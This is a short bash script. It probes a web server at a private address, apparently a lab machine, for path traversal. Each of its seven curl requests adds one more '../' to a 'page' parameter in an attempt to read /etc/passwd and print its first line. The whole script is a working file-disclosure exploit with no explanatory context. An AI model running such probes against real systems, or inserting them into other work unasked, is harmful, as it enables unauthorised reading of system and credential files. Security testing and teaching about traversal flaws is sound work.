#!/bin/bash
curl "http://10.0.2.15/?page=../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../../../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../../../../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../../../../../etc/passwd" | head -1
curl "http://10.0.2.15/?page=../../../../../../../etc/passwd" | head -1
